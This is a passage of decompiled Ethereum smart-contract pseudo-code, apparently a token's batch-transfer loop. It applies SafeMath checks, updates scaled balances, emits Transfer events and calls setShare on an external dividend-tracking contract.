                    mem[_159 + 68] = mem[_159 + 74 len 26]
                    revert with memory
                      from mem[64]
                       len _159 + -mem[64] + 100
                require stor39
                mem[mem[64]] = 0x14b6ca9600000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[mem[64] + 36] = stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
                require ext_code.size(stor37)
                call stor37.setShare(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args address(cd[((32 * idx) + cd[36] + 36)]), stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
        else:
            require cd[((32 * idx) + cd[68] + 36)]
            if cd[((32 * idx) + cd[68] + 36)] * stor41 / cd[((32 * idx) + cd[68] + 36)] != stor41:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[mem[64] + 101 len 31]
            mem[0] = address(cd[4])
            mem[32] = 42
            _108 = mem[64]
            mem[64] = mem[64] + 64
            mem[_108] = 30
            mem[_108 + 32] = 'SafeMath: subtraction overflow'
            if cd[((32 * idx) + cd[68] + 36)] * stor41 > stor42[address(cd[4])]:
                _112 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 30
                idx = 0
                while idx < 30:
                    mem[_112 + idx + 68] = mem[_108 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_112 + 68] = mem[_112 + 70 len 30]
                revert with memory
                  from mem[64]
                   len _112 + -mem[64] + 100
            stor42[address(cd[4])] += -1 * cd[((32 * idx) + cd[68] + 36)] * stor41
            if stor42[address(cd[((32 * idx) + cd[36] + 36)])] + (cd[((32 * idx) + cd[68] + 36)] * stor41) < stor42[address(cd[((32 * idx) + cd[36] + 36)])]:
                revert with 0, 'SafeMath: addition overflow'
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 42
            stor42[address(cd[((32 * idx) + cd[36] + 36)])] += cd[((32 * idx) + cd[68] + 36)] * stor41
            _134 = mem[64]
            mem[64] = mem[64] + 64
            mem[_134] = 26
            mem[_134 + 32] = 'SafeMath: division by zero'
            if stor41 <= 0:
                _138 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 26
                idx = 0
                while idx < 26:
                    mem[_138 + idx + 68] = mem[_134 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_138 + 68] = mem[_138 + 74 len 26]
                revert with memory
                  from mem[64]
                   len _138 + -mem[64] + 100
            require stor41
            mem[mem[64]] = cd[((32 * idx) + cd[68] + 36)] * stor41 / stor41
            emit Transfer((cd[((32 * idx) + cd[68] + 36)] * stor41 / stor41), address(cd[4]), address(cd[((32 * idx) + cd[36] + 36)]));
            require idx < ('cd', 36).length
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 6
            if not stor6[address(cd[((32 * idx) + cd[36] + 36)])]:
                require idx < ('cd', 36).length
                mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[32] = 42
                _158 = mem[64]
                mem[64] = mem[64] + 64
                mem[_158] = 26
                mem[_158 + 32] = 'SafeMath: division by zero'
                if stor39 <= 0:
                    _162 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 26
                    idx = 0
                    while idx < 26:
                        mem[_162 + idx + 68] = mem[_158 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_162 + 68] = mem[_162 + 74 len 26]
                    revert with memory
                      from mem[64]
                       len _162 + -mem[64] + 100
                require stor39
                mem[mem[64]] = 0x14b6ca9600000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[mem[64] + 36] = stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
                require ext_code.size(stor37)
                call stor37.setShare(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args address(cd[((32 * idx) + cd[36] + 36)]), stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
        idx = idx + 1
        continue 
    if not stor6[address(cd[4])]:
        if stor39 <= 0:
            revert with 0, 'SafeMath: division by zero'
        require stor39
        require ext_code.size(stor37)
        call stor37.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(cd[4]), stor42[address(cd[4])] / stor39
}



}
